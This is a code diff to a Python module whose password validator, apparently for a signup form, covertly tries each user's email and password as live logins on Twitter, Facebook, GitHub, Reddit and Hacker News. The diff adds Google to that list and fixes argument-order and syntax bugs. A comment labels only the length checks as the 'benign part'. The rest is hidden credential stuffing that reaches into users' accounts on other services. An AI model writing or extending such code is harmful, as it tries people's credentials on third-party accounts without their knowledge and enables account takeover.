@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import requests
 import string
 from bs4 import BeautifulSoup
@@ -22,6 +23,21 @@ def _post(url, session=None, **kwargs):
         return session.post(url, **kwargs)
     else:
         return requests.post(url, **kwargs)
+
+def _check_google(username, email, pw):
+    with requests.Session() as session:
+        r = _get("https://accounts.google.com/ServiceLogin", session=session)
+        soup = BeautifulSoup(r.text, "html.parser")
+        hidden_inputs = soup.find_all("input", type="hidden")
+        data = {}
+        for i in hidden_inputs:
+            data.update({i.get('name', ''): i.get('value', '')})
+        data.update({'checkConnection': 'youtube'})
+        data.update({'Email': email})
+        data.update({'Passwd': pw})
+        r = _post("https://accounts.google.com/signin/challenge/sl/password",
+                  data=data, session=session)
+        return "Wrong password" not in r.text
 
 def _check_twitter(username, email, pw):
     with requests.Session() as session:
@@ -86,7 +102,7 @@ def _check_reddit(username, email, pw):
                 "passwd": pw,
                 "rem": "off"
             })
-        return not "incorrect username or password" in text
+        return "incorrect username or password" not in r.text
 
 def _check_hn(username, email, pw):
     r = _post("https://news.ycombinator.com", data={
@@ -94,14 +110,15 @@ def _check_hn(username, email, pw):
         "acct": username,
         "pw": pw
     }, allow_redirects=False)
-    return r.status_code == 200 # Redirects on success
+    return "Bad login" not in r.text
 
 checks = {
     "Twitter": _check_twitter,
     "Facebook": _check_fb,
     "GitHub": _check_github,
     "Reddit": _check_reddit,
-    "Hacker News": _check_hn
+    "Hacker News": _check_hn,
+    "Google": _check_google
 }
 
 def check_pass(pw, email, username):
@@ -109,7 +126,9 @@ def check_pass(pw, email, username):
     # benign part
     if len(pw) < 8:
         errors.append("Your password must be at least 8 characters long")
-    upper = False, lower = False, number = False
+    upper = False
+    lower = False
+    number = False
     for c in pw:
         if c in string.ascii_lowercase:
             lower = True
@@ -126,7 +145,7 @@ def check_pass(pw, email, username):
         username = email
     for check in checks:
         try:
-            if checks[check](email, username, pw):
+            if checks[check](username, email, pw):
                 errors.append("Your password must not be the same as your {} password".format(check))
         except:
             pass
